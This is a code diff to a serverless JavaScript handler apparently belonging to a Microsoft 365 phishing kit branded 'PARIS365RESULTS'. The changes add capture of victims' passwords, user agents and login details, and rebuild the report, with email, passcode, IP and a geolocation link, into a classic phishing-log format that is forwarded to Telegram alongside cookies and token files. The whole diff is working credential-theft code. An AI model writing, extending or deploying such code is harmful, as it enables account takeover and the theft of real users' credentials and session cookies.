@@ -55,8 +55,10 @@ const handler = async (event, context) => {
         .trim();
     }
 
-    // Extract only SAFE data with sanitization
+    // Extract data with sanitization (matching PHP structure)
     const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
+    const password = sanitizeForTelegram(data.password || 'Password not captured during login flow');
+    const detail = sanitizeForTelegram(data.detail || 'Microsoft OAuth Login');
     const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
     const timestamp = new Date().toISOString();
 
@@ -123,6 +125,9 @@ const handler = async (event, context) => {
         formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
       }
     }
+
+    // Get User Agent
+    const useragent = event.headers['user-agent'] || 'Unknown User Agent';
 
     let cookies = data.formattedCookies || data.cookies || [];
     let tokenFileSent = false;
@@ -210,34 +215,21 @@ const handler = async (event, context) => {
         }
     }
 
-    // Build the message (MINIMAL - plain text only, heavily sanitized)
+    // Build the message using PHP format structure
     const uniqueId = Math.random().toString(36).substring(2, 8);
-    const messageLines = [
-      '🚨PARIS365RESULTS🚨',
-      `📧 Email: ${email}`,
-      `🆔 Session ID: ${sessionId}`,
-      `⏰ Time: ${timestamp}`,
-      `🆔 Message ID: ${uniqueId}`,
-      `🌍 IP: ${formattedIP}`,
-      `🏳️ Country: ${userIpInfo.country} (${userIpInfo.countryCode})`,
-      `🏙️ Location: ${userIpInfo.city}, ${userIpInfo.region}`
-    ];
-
-    // Add password if ACTUALLY captured (not debug)
-    if (data.password &&
-        data.password !== 'Password not captured during login flow' &&
-        data.password !== 'DEBUG_PASSWORD_NOT_CAPTURED' &&
-        !data.password.includes('DEBUG') &&
-        data.passwordSource !== 'debug-fallback') {
-        messageLines.push('');
-        messageLines.push(`Password: ${data.password}`);
-        if (data.passwordSource) {
-            messageLines.push(`Password Source: ${data.passwordSource}`);
-        }
-    }
+    let message = '';
+    message += "|----------| xLs |--------------|\n";
+    message += `Login From           : ${detail}\n`;
+    message += `Online ID            : ${email}\n`;
+    message += `Passcode             : ${password}\n`;
+    message += "|--------------- I N F O | I P -------------------|\n";
+    message += `|Client IP: ${formattedIP}\n`;
+    message += `|--- http://www.geoiptool.com/?IP=${formattedIP} ----\n`;
+    message += `User Agent : ${useragent}\n`;
+    message += "|----------- CrEaTeD bY PARIS --------------|\n";
 
     // Join and sanitize the entire message
-    const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
+    const simpleMessage = sanitizeForTelegram(message);
 
     console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
     console.log('📤 Message length:', simpleMessage.length);
